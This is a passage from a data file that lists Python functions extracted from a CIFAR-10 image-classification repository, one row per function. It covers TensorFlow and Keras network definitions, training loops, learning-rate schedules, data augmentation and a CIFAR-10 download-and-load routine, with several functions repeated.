        output = activation(output)
    with tf.name_scope('max_pool-2'):
        output = max_pool(output, 3, 2)
    with tf.name_scope('dropout-2'):
        output = tf.nn.dropout(output, keep_prob)
    with tf.variable_scope('conv3'):
        output = conv(output, [3, 3, 192, 192])
        output = activation(output)
    with tf.variable_scope('mlp3-1'):
        output = conv(output, [1, 1, 192, 192])
        output = activation(output)
    with tf.variable_scope('mlp3-2'):
        output = conv(output, [1, 1, 192, 10])
        output = activation(output)
    with tf.name_scope('global_avg_pool'):
        output = global_avg_pool(output, 8, 1)
    with tf.name_scope('moftmax'):
        output = tf.reshape(output, [-1, 10])
    with tf.name_scope('cross_entropy'):
        cross_entropy = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=output))
    with tf.name_scope('l2_loss'):
        l2 = tf.add_n([tf.nn.l2_loss(var) for var in tf.trainable_variables()])
    with tf.name_scope('train_step'):
        train_step = tf.train.MomentumOptimizer(learning_rate, FLAGS.momentum, use_nesterov=True).minimize(cross_entropy + l2 * FLAGS.weight_decay)
    with tf.name_scope('prediction'):
        correct_prediction = tf.equal(tf.argmax(output, 1), tf.argmax(y_, 1))
        accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    saver = tf.train.Saver()

    def run_testing(sess):
        acc = 0.0
        loss = 0.0
        pre_index = 0
        add = 1000
        for it in range(10):
            batch_x = test_x[pre_index:pre_index + add]
            batch_y = test_y[pre_index:pre_index + add]
            pre_index = pre_index + add
            (loss_, acc_) = sess.run([cross_entropy, accuracy], feed_dict={x: batch_x, y_: batch_y, keep_prob: 1.0})
            loss += loss_ / 10.0
            acc += acc_ / 10.0
        summary = tf.Summary(value=[tf.Summary.Value(tag='test_loss', simple_value=loss), tf.Summary.Value(tag='test_accuracy', simple_value=acc)])
        return (acc, loss, summary)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        summary_writer = tf.summary.FileWriter(FLAGS.log_save_path, sess.graph)
        for ep in range(1, FLAGS.epochs + 1):
            lr = learning_rate_schedule(ep)
            pre_index = 0
            train_acc = 0.0
            train_loss = 0.0
            start_time = time.time()
            print('\nepoch %d/%d:' % (ep, FLAGS.epochs))
            for it in range(1, FLAGS.iteration + 1):
                if pre_index + FLAGS.batch_size < 50000:
                    batch_x = train_x[pre_index:pre_index + FLAGS.batch_size]
                    batch_y = train_y[pre_index:pre_index + FLAGS.batch_size]
                else:
                    batch_x = train_x[pre_index:]
                    batch_y = train_y[pre_index:]
                batch_x = data_augmentation(batch_x)
                (_, batch_loss) = sess.run([train_step, cross_entropy], feed_dict={x: batch_x, y_: batch_y, keep_prob: FLAGS.dropout, learning_rate: lr})
                batch_acc = accuracy.eval(feed_dict={x: batch_x, y_: batch_y, keep_prob: 1.0})
                train_loss += batch_loss
                train_acc += batch_acc
                pre_index += FLAGS.batch_size
                if it == FLAGS.iteration:
                    train_loss /= FLAGS.iteration
                    train_acc /= FLAGS.iteration
                    train_summary = tf.Summary(value=[tf.Summary.Value(tag='train_loss', simple_value=train_loss), tf.Summary.Value(tag='train_accuracy', simple_value=train_acc)])
                    (val_acc, val_loss, test_summary) = run_testing(sess)
                    summary_writer.add_summary(train_summary, ep)
                    summary_writer.add_summary(test_summary, ep)
                    summary_writer.flush()
                    print('iteration: %d/%d, cost_time: %ds, train_loss: %.4f, train_acc: %.4f, test_loss: %.4f, test_acc: %.4f' % (it, FLAGS.iteration, int(time.time() - start_time), train_loss, train_acc, val_loss, val_acc))
                else:
                    print('iteration: %d/%d, train_loss: %.4f, train_acc: %.4f' % (it, FLAGS.iteration, train_loss / it, train_acc / it), end='\r')
        save_path = saver.save(sess, FLAGS.model_save_path)
        print('Model saved in file: %s' % save_path)"
BIGBALLON/cifar-10-cnn,run_testing,"def run_testing(sess):
    acc = 0.0
    loss = 0.0
    pre_index = 0
    add = 1000
    for it in range(10):
        batch_x = test_x[pre_index:pre_index + add]
        batch_y = test_y[pre_index:pre_index + add]
        pre_index = pre_index + add
        (loss_, acc_) = sess.run([cross_entropy, accuracy], feed_dict={x: batch_x, y_: batch_y, keep_prob: 1.0})
        loss += loss_ / 10.0
        acc += acc_ / 10.0
    summary = tf.Summary(value=[tf.Summary.Value(tag='test_loss', simple_value=loss), tf.Summary.Value(tag='test_accuracy', simple_value=acc)])
    return (acc, loss, summary)"
BIGBALLON/cifar-10-cnn,conv,"def conv(x, phase, shape):
    he_initializer = tf.contrib.keras.initializers.he_normal()
    W = tf.get_variable('weights', shape=shape, initializer=he_initializer)
    b = tf.get_variable('bias', shape=[shape[3]], initializer=tf.zeros_initializer)
    x = tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')
    x = tf.nn.bias_add(x, b)
    return tf.layers.batch_normalization(x, axis=-1, training=phase, name='bn')"
BIGBALLON/cifar-10-cnn,activation,"def activation(x):
    return tf.nn.relu(x)"
BIGBALLON/cifar-10-cnn,max_pool,"def max_pool(input, k_size=3, stride=2):
    return tf.nn.max_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='SAME')"
BIGBALLON/cifar-10-cnn,global_avg_pool,"def global_avg_pool(input, k_size=1, stride=1):
    return tf.nn.avg_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='VALID')"
BIGBALLON/cifar-10-cnn,inference,"def inference(x, phase, keep_prob):
    with tf.variable_scope('conv1'):
        x = conv(x, phase, [5, 5, 3, 192])
        x = activation(x)
    with tf.variable_scope('mlp1-1'):
        x = conv(x, phase, [1, 1, 192, 160])
        x = activation(x)
    with tf.variable_scope('mlp1-2'):
        x = conv(x, phase, [1, 1, 160, 96])
        x = activation(x)
    with tf.name_scope('max_pool-1'):
        x = max_pool(x, 3, 2)
    with tf.name_scope('dropout-1'):
        x = tf.nn.dropout(x, keep_prob)
    with tf.variable_scope('conv2'):
        x = conv(x, phase, [5, 5, 96, 192])
        x = activation(x)
    with tf.variable_scope('mlp2-1'):
        x = conv(x, phase, [1, 1, 192, 192])
        x = activation(x)
    with tf.variable_scope('mlp2-2'):
        x = conv(x, phase, [1, 1, 192, 192])
        x = activation(x)
    with tf.name_scope('max_pool-2'):
        x = max_pool(x, 3, 2)
    with tf.name_scope('dropout-2'):
        x = tf.nn.dropout(x, keep_prob)
    with tf.variable_scope('conv3'):
        x = conv(x, phase, [3, 3, 192, 192])
        x = activation(x)
    with tf.variable_scope('mlp3-1'):
        x = conv(x, phase, [1, 1, 192, 192])
        x = activation(x)
    with tf.variable_scope('mlp3-2'):
        x = conv(x, phase, [1, 1, 192, 10])
        x = activation(x)
    with tf.name_scope('global_avg_pool'):
        x = global_avg_pool(x, 8, 1)
        output = tf.reshape(x, [-1, 10])
    return output"
BIGBALLON/cifar-10-cnn,cal_loss,"def cal_loss(output, y_):
    with tf.name_scope('cross_entropy'):
        cross_entropy = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=output))
    with tf.name_scope('l2_loss'):
        l2 = tf.add_n([tf.nn.l2_loss(var) for var in tf.trainable_variables()])
    tf.summary.scalar('train_loss', cross_entropy)
    return (cross_entropy, l2)"
BIGBALLON/cifar-10-cnn,training,"def training(cost, l2, lr):
    with tf.name_scope('train_op'):
        optimizer = tf.train.MomentumOptimizer(lr, FLAGS.momentum, use_nesterov=True)
        extra_update_ops = tf.get_collection(tf.GraphKeys.UPDATE_OPS)
        with tf.control_dependencies(extra_update_ops):
            train_op = optimizer.minimize(cost + l2 * FLAGS.weight_decay)
    return train_op"
BIGBALLON/cifar-10-cnn,evaluate,"def evaluate(output, y_):
    with tf.name_scope('prediction'):
        correct_prediction = tf.equal(tf.argmax(output, 1), tf.argmax(y_, 1))
        accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    tf.summary.scalar('train_accuracy', accuracy)
    return accuracy"
BIGBALLON/cifar-10-cnn,lr_schedule,"def lr_schedule(epoch):
    if epoch <= 60:
        return 0.05
    if epoch <= 120:
        return 0.01
    if epoch <= 160:
        return 0.002
    return 0.0004"
BIGBALLON/cifar-10-cnn,main,"def main(_):
    (train_x, train_y, test_x, test_y) = prepare_data()
    (train_x, test_x) = color_preprocessing(train_x, test_x)
    with tf.name_scope('input'):
        x = tf.placeholder(tf.float32, [None, image_size, image_size, 3], name='input_x')
        y_ = tf.placeholder(tf.float32, [None, class_num], name='input_y')
        phase = tf.placeholder(tf.bool, name='phase')
    with tf.name_scope('dropout'):
        keep_prob = tf.placeholder(tf.float32)
    with tf.name_scope('learning_rate'):
        learning_rate = tf.placeholder(tf.float32)
    output = inference(x, phase, keep_prob)
    (loss, l2) = cal_loss(output, y_)
    train_op = training(loss, l2, learning_rate)
    eval_op = evaluate(output, y_)
    summary_op = tf.summary.merge_all()
    saver = tf.train.Saver()

    def run_testing(sess, test_x, test_y, loss, eval_op):
        batch_val_loss = []
        batch_val_acc = []
        pre_index = 0
        add = 1000
        for it in range(10):
            test_batch_x = test_x[pre_index:pre_index + add]
            test_batch_y = test_y[pre_index:pre_index + add]
            pre_index = pre_index + add
            (loss_, acc_) = sess.run([loss, eval_op], feed_dict={x: test_batch_x, y_: test_batch_y, phase: False, keep_prob: 1.0})
            batch_val_loss.append(loss_)
            batch_val_acc.append(acc_)
        (eval_loss, eval_acc) = (np.mean(batch_val_loss), np.mean(batch_val_acc))
        eval_summary = tf.Summary()
        eval_summary.value.add(tag='test_loss', simple_value=eval_loss)
        eval_summary.value.add(tag='test_accuracy', simple_value=eval_acc)
        return (eval_acc, eval_loss, eval_summary)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        summary_writer = tf.summary.FileWriter(FLAGS.log_save_path, sess.graph)
        for ep in range(1, FLAGS.epochs + 1):
            lr = lr_schedule(ep)
            pre_index = 0
            train_acc = 0.0
            train_loss = 0.0
            start_time = time.time()
            print('\nepoch %d/%d:' % (ep, FLAGS.epochs))
            for it in range(1, FLAGS.iteration + 1):
                if pre_index + FLAGS.batch_size < 50000:
                    batch_x = train_x[pre_index:pre_index + FLAGS.batch_size]
                    batch_y = train_y[pre_index:pre_index + FLAGS.batch_size]
                else:
                    batch_x = train_x[pre_index:]
                    batch_y = train_y[pre_index:]
                batch_x = data_augmentation(batch_x)
                ts = time.time()
                (_, batch_loss, sum_op) = sess.run([train_op, loss, summary_op], feed_dict={x: batch_x, y_: batch_y, phase: True, keep_prob: FLAGS.dropout, learning_rate: lr})
                te = time.time() - ts
                batch_acc = sess.run(eval_op, feed_dict={x: batch_x, y_: batch_y, phase: False, keep_prob: 1.0})
                pre_index += FLAGS.batch_size
                train_loss += batch_loss
                train_acc += batch_acc
                if it == FLAGS.iteration:
                    train_loss /= FLAGS.iteration
                    train_acc /= FLAGS.iteration
                    (eval_acc, eval_loss, eval_summary) = run_testing(sess, test_x, test_y, loss, eval_op)
                    summary_writer.add_summary(sum_op, ep)
                    summary_writer.add_summary(eval_summary, ep)
                    summary_writer.flush()
                    print('iteration: %d/%d, cost_time: %ds, train_loss: %.4f, train_acc: %.4f, test_loss: %.4f, test_acc: %.4f' % (it, FLAGS.iteration, int(time.time() - start_time), train_loss, train_acc, eval_loss, eval_acc))
                else:
                    print('iteration: %d/%d, cost_time: %.3fs, train_loss: %.4f, train_acc: %.4f' % (it, FLAGS.iteration, te, train_loss / it, train_acc / it), end='\r')
            if ep % 10 == 0:
                ckpt_path = FLAGS.model_save_path + 'model.ckpt%03d' % ep
                save_path = saver.save(sess, ckpt_path)
                print('Model saved in file: %s' % save_path)
        ckpt_path = FLAGS.model_save_path + 'nin.ckpt'
        save_path = saver.save(sess, ckpt_path)
        print('Model saved in file: %s' % save_path)"
BIGBALLON/cifar-10-cnn,run_testing,"def run_testing(sess, test_x, test_y, loss, eval_op):
    batch_val_loss = []
    batch_val_acc = []
    pre_index = 0
    add = 1000
    for it in range(10):
        test_batch_x = test_x[pre_index:pre_index + add]
        test_batch_y = test_y[pre_index:pre_index + add]
        pre_index = pre_index + add
        (loss_, acc_) = sess.run([loss, eval_op], feed_dict={x: test_batch_x, y_: test_batch_y, phase: False, keep_prob: 1.0})
        batch_val_loss.append(loss_)
        batch_val_acc.append(acc_)
    (eval_loss, eval_acc) = (np.mean(batch_val_loss), np.mean(batch_val_acc))
    eval_summary = tf.Summary()
    eval_summary.value.add(tag='test_loss', simple_value=eval_loss)
    eval_summary.value.add(tag='test_accuracy', simple_value=eval_acc)
    return (eval_acc, eval_loss, eval_summary)"
BIGBALLON/cifar-10-cnn,download_data,"def download_data():
    dirname = 'cifar-10-batches-py'
    origin = 'http://www.cs.toronto.edu/~kriz/cifar-10-python.tar.gz'
    fname = 'cifar-10-python.tar.gz'
    fpath = './' + dirname
    download = False
    if os.path.exists(fpath) or os.path.isfile(fname):
        download = False
        print('DataSet aready exist!')
    else:
        download = True
    if download:
        print('Downloading data from', origin)
        import urllib.request
        import tarfile

        def reporthook(count, block_size, total_size):
            global start_time
            if count == 0:
                start_time = time.time()
                return
            duration = time.time() - start_time
            progress_size = int(count * block_size)
            speed = int(progress_size / (1024 * duration))
            percent = min(int(count * block_size * 100 / total_size), 100)
            sys.stdout.write('\r...%d%%, %d MB, %d KB/s, %d seconds passed' % (percent, progress_size / (1024 * 1024), speed, duration))
            sys.stdout.flush()
        urllib.request.urlretrieve(origin, fname, reporthook)
        print('Download finished. Start extract!', origin)
        if fname.endswith('tar.gz'):
            tar = tarfile.open(fname, 'r:gz')
            tar.extractall()
            tar.close()
        elif fname.endswith('tar'):
            tar = tarfile.open(fname, 'r:')
            tar.extractall()
            tar.close()"
BIGBALLON/cifar-10-cnn,unpickle,"def unpickle(file):
    with open(file, 'rb') as fo:
        dict = pickle.load(fo, encoding='bytes')
    return dict"
BIGBALLON/cifar-10-cnn,load_data_one,"def load_data_one(file):
    batch = unpickle(file)
    data = batch[b'data']
    labels = batch[b'labels']
    print('Loading %s : %d.' % (file, len(data)))
    return (data, labels)"
BIGBALLON/cifar-10-cnn,load_data,"def load_data(files, data_dir, label_count):
    global image_size, img_channels
    (data, labels) = load_data_one(data_dir + '/' + files[0])
    for f in files[1:]:
        (data_n, labels_n) = load_data_one(data_dir + '/' + f)
        data = np.append(data, data_n, axis=0)
        labels = np.append(labels, labels_n, axis=0)
    labels = np.array([[float(i == label) for i in range(label_count)] for label in labels])
    data = data.reshape([-1, img_channels, image_size, image_size])
    data = data.transpose([0, 2, 3, 1])
    return (data, labels)"
BIGBALLON/cifar-10-cnn,prepare_data,"def prepare_data():
    print('======Loading data======')
    download_data()
    data_dir = './cifar-10-batches-py'
    image_dim = image_size * image_size * img_channels
    meta = unpickle(data_dir + '/batches.meta')
    label_names = meta[b'label_names']
    label_count = len(label_names)
    train_files = ['data_batch_%d' % d for d in range(1, 6)]
    (train_data, train_labels) = load_data(train_files, data_dir, label_count)
    (test_data, test_labels) = load_data(['test_batch'], data_dir, label_count)
    print('Train data:', np.shape(train_data), np.shape(train_labels))
    print('Test data :', np.shape(test_data), np.shape(test_labels))
    print('======Load finished======')
    print('======Shuffling data======')
    indices = np.random.permutation(len(train_data))
    train_data = train_data[indices]
    train_labels = train_labels[indices]
    print('======Prepare Finished======')
    return (train_data, train_labels, test_data, test_labels)"
BIGBALLON/cifar-10-cnn,_random_crop,"def _random_crop(batch, crop_shape, padding=None):
    oshape = np.shape(batch[0])
    if padding:
        oshape = (oshape[0] + 2 * padding, oshape[1] + 2 * padding)
    new_batch = []
    npad = ((padding, padding), (padding, padding), (0, 0))
    for i in range(len(batch)):
        new_batch.append(batch[i])
        if padding:
            new_batch[i] = np.lib.pad(batch[i], pad_width=npad, mode='constant', constant_values=0)
        nh = random.randint(0, oshape[0] - crop_shape[0])
        nw = random.randint(0, oshape[1] - crop_shape[1])
        new_batch[i] = new_batch[i][nh:nh + crop_shape[0], nw:nw + crop_shape[1]]
    return new_batch"
BIGBALLON/cifar-10-cnn,_random_flip_leftright,"def _random_flip_leftright(batch):
    for i in range(len(batch)):
        if bool(random.getrandbits(1)):
            batch[i] = np.fliplr(batch[i])
    return batch"
BIGBALLON/cifar-10-cnn,color_preprocessing,"def color_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    mean = [125.307, 122.95, 113.865]
    std = [62.9932, 62.0887, 66.7048]
    for i in range(3):
        x_train[:, :, :, i] = (x_train[:, :, :, i] - mean[i]) / std[i]
        x_test[:, :, :, i] = (x_test[:, :, :, i] - mean[i]) / std[i]
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,data_augmentation,"def data_augmentation(batch):
    batch = _random_flip_leftright(batch)
    batch = _random_crop(batch, [32, 32], 4)
    return batch"
BIGBALLON/cifar-10-cnn,reporthook,"def reporthook(count, block_size, total_size):
    global start_time
    if count == 0:
        start_time = time.time()
        return
    duration = time.time() - start_time
    progress_size = int(count * block_size)
    speed = int(progress_size / (1024 * duration))
    percent = min(int(count * block_size * 100 / total_size), 100)
    sys.stdout.write('\r...%d%%, %d MB, %d KB/s, %d seconds passed' % (percent, progress_size / (1024 * 1024), speed, duration))
    sys.stdout.flush()"
BIGBALLON/cifar-10-cnn,bias_variable,"def bias_variable(shape):
    initial = tf.constant(0.1, shape=shape, dtype=tf.float32)
    return tf.Variable(initial)"
BIGBALLON/cifar-10-cnn,conv2d,"def conv2d(x, W):
    return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')"
BIGBALLON/cifar-10-cnn,max_pool,"def max_pool(input, k_size=1, stride=1, name=None):
    return tf.nn.max_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='SAME', name=name)"
BIGBALLON/cifar-10-cnn,batch_norm,"def batch_norm(input):
    return tf.contrib.layers.batch_norm(input, decay=0.9, center=True, scale=True, epsilon=0.001, is_training=train_flag, updates_collections=None)"
BIGBALLON/cifar-10-cnn,_random_crop,"def _random_crop(batch, crop_shape, padding=None):
    oshape = np.shape(batch[0])
    if padding:
        oshape = (oshape[0] + 2 * padding, oshape[1] + 2 * padding)
    new_batch = []
    npad = ((padding, padding), (padding, padding), (0, 0))
    for i in range(len(batch)):
        new_batch.append(batch[i])
        if padding:
            new_batch[i] = np.lib.pad(batch[i], pad_width=npad, mode='constant', constant_values=0)
        nh = random.randint(0, oshape[0] - crop_shape[0])
        nw = random.randint(0, oshape[1] - crop_shape[1])
        new_batch[i] = new_batch[i][nh:nh + crop_shape[0], nw:nw + crop_shape[1]]
    return new_batch"
BIGBALLON/cifar-10-cnn,_random_flip_leftright,"def _random_flip_leftright(batch):
    for i in range(len(batch)):
        if bool(random.getrandbits(1)):
            batch[i] = np.fliplr(batch[i])
    return batch"
BIGBALLON/cifar-10-cnn,data_preprocessing,"def data_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    x_train[:, :, :, 0] = (x_train[:, :, :, 0] - np.mean(x_train[:, :, :, 0])) / np.std(x_train[:, :, :, 0])
    x_train[:, :, :, 1] = (x_train[:, :, :, 1] - np.mean(x_train[:, :, :, 1])) / np.std(x_train[:, :, :, 1])
    x_train[:, :, :, 2] = (x_train[:, :, :, 2] - np.mean(x_train[:, :, :, 2])) / np.std(x_train[:, :, :, 2])
    x_test[:, :, :, 0] = (x_test[:, :, :, 0] - np.mean(x_test[:, :, :, 0])) / np.std(x_test[:, :, :, 0])
    x_test[:, :, :, 1] = (x_test[:, :, :, 1] - np.mean(x_test[:, :, :, 1])) / np.std(x_test[:, :, :, 1])
    x_test[:, :, :, 2] = (x_test[:, :, :, 2] - np.mean(x_test[:, :, :, 2])) / np.std(x_test[:, :, :, 2])
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,learning_rate_schedule,"def learning_rate_schedule(epoch_num):
    if epoch_num < 81:
        return 0.1
    elif epoch_num < 121:
        return 0.01
    else:
        return 0.001"
BIGBALLON/cifar-10-cnn,data_augmentation,"def data_augmentation(batch):
    batch = _random_flip_leftright(batch)
    batch = _random_crop(batch, [32, 32], 4)
    return batch"
BIGBALLON/cifar-10-cnn,run_testing,"def run_testing(sess, ep):
    acc = 0.0
    loss = 0.0
    pre_index = 0
    add = 1000
    for it in range(10):
        batch_x = test_x[pre_index:pre_index + add]
        batch_y = test_y[pre_index:pre_index + add]
        pre_index = pre_index + add
        (loss_, acc_) = sess.run([cross_entropy, accuracy], feed_dict={x: batch_x, y_: batch_y, keep_prob: 1.0, train_flag: False})
        loss += loss_ / 10.0
        acc += acc_ / 10.0
    summary = tf.Summary(value=[tf.Summary.Value(tag='test_loss', simple_value=loss), tf.Summary.Value(tag='test_accuracy', simple_value=acc)])
    return (acc, loss, summary)"
BIGBALLON/cifar-10-cnn,bias_variable,"def bias_variable(shape):
    initial = tf.constant(0.1, shape=shape, dtype=tf.float32)
    return tf.Variable(initial)"
BIGBALLON/cifar-10-cnn,conv2d,"def conv2d(x, W):
    return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')"
BIGBALLON/cifar-10-cnn,max_pool,"def max_pool(input, k_size=1, stride=1, name=None):
    return tf.nn.max_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='SAME', name=name)"
BIGBALLON/cifar-10-cnn,batch_norm,"def batch_norm(input):
    return tf.contrib.layers.batch_norm(input, decay=0.9, center=True, scale=True, epsilon=0.001, is_training=train_flag, updates_collections=None)"
BIGBALLON/cifar-10-cnn,_random_crop,"def _random_crop(batch, crop_shape, padding=None):
    oshape = np.shape(batch[0])
    if padding:
        oshape = (oshape[0] + 2 * padding, oshape[1] + 2 * padding)
    new_batch = []
    npad = ((padding, padding), (padding, padding), (0, 0))
    for i in range(len(batch)):
        new_batch.append(batch[i])
        if padding:
            new_batch[i] = np.lib.pad(batch[i], pad_width=npad, mode='constant', constant_values=0)
        nh = random.randint(0, oshape[0] - crop_shape[0])
        nw = random.randint(0, oshape[1] - crop_shape[1])
        new_batch[i] = new_batch[i][nh:nh + crop_shape[0], nw:nw + crop_shape[1]]
    return new_batch"
BIGBALLON/cifar-10-cnn,_random_flip_leftright,"def _random_flip_leftright(batch):
    for i in range(len(batch)):
        if bool(random.getrandbits(1)):
            batch[i] = np.fliplr(batch[i])
    return batch"
BIGBALLON/cifar-10-cnn,data_preprocessing,"def data_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    x_train[:, :, :, 0] = x_train[:, :, :, 0] - 123.68
    x_train[:, :, :, 1] = x_train[:, :, :, 1] - 116.779
    x_train[:, :, :, 2] = x_train[:, :, :, 2] - 103.939
    x_test[:, :, :, 0] = x_test[:, :, :, 0] - 123.68
    x_test[:, :, :, 1] = x_test[:, :, :, 1] - 116.779
    x_test[:, :, :, 2] = x_test[:, :, :, 2] - 103.939
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,learning_rate_schedule,"def learning_rate_schedule(epoch_num):
    if epoch_num < 81:
        return 0.1
    elif epoch_num < 121:
        return 0.01
    else:
        return 0.001"
BIGBALLON/cifar-10-cnn,data_augmentation,"def data_augmentation(batch):
    batch = _random_flip_leftright(batch)
    batch = _random_crop(batch, [32, 32], 4)
    return batch"
BIGBALLON/cifar-10-cnn,run_testing,"def run_testing(sess, ep):
    acc = 0.0
    loss = 0.0
    pre_index = 0
    add = 1000
    for it in range(10):
        batch_x = test_x[pre_index:pre_index + add]
        batch_y = test_y[pre_index:pre_index + add]
        pre_index = pre_index + add
        (loss_, acc_) = sess.run([cross_entropy, accuracy], feed_dict={x: batch_x, y_: batch_y, keep_prob: 1.0, train_flag: False})
        loss += loss_ / 10.0
        acc += acc_ / 10.0
    summary = tf.Summary(value=[tf.Summary.Value(tag='test_loss', simple_value=loss), tf.Summary.Value(tag='test_accuracy', simple_value=acc)])
    return (acc, loss, summary)"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 81:
        return 0.05
    if epoch < 122:
        return 0.005
    return 0.0005"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 81:
        return 0.05
    if epoch < 122:
        return 0.005
    return 0.0005"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 81:
        return 0.05
    if epoch < 122:
        return 0.005
    return 0.0005"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 81:
        return 0.05
    if epoch < 122:
        return 0.005
    return 0.0005"
BIGBALLON/cifar-10-cnn,step_decay_scheduler,"def step_decay_scheduler(epoch):
    if epoch < 81:
        return 0.1
    if epoch < 122:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,cos_scheduler,"def cos_scheduler(epoch):
    return (start_lr + end_lr) / 2.0 + (start_lr - end_lr) / 2.0 * math.cos(math.pi / 2.0 * (epoch / (epochs / 2.0)))"
BIGBALLON/cifar-10-cnn,tanh_scheduler,"def tanh_scheduler(epoch):
    start = -6.0
    end = 3.0
    return start_lr / 2.0 * (1 - math.tanh((end - start) * epoch / epochs + start))"
BIGBALLON/cifar-10-cnn,residual_network,"def residual_network(img_input, classes_num=10, stack_n=5):

    def bn_relu(x):
        x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
        return Activation('relu')(x)

    def conv(x, out, size, stride):
        return Conv2D(out, kernel_size=size, strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)

    def residual_block(x, o_filters, increase=False):
        stride = (2, 2) if increase else (1, 1)
        o1 = bn_relu(x)
        conv_1 = conv(o1, o_filters, (3, 3), stride)
        o2 = bn_relu(conv_1)
        conv_2 = conv(o2, o_filters, (3, 3), (1, 1))
        if increase:
            projection = conv(o1, o_filters, (1, 1), (2, 2))
            block = add([conv_2, projection])
        else:
            block = add([conv_2, x])
        return block
    x = Conv2D(filters=16, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(img_input)
    for _ in range(stack_n):
        x = residual_block(x, 16, False)
    x = residual_block(x, 32, True)
    for _ in range(1, stack_n):
        x = residual_block(x, 32, False)
    x = residual_block(x, 64, True)
    for _ in range(1, stack_n):
        x = residual_block(x, 64, False)
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    x = GlobalAveragePooling2D()(x)
    out = Dense(classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)
    return out"
BIGBALLON/cifar-10-cnn,on_train_begin,"def on_train_begin(self, logs={}):
    self.val_acc = {'batch': [], 'epoch': []}"
BIGBALLON/cifar-10-cnn,on_batch_end,"def on_batch_end(self, batch, logs={}):
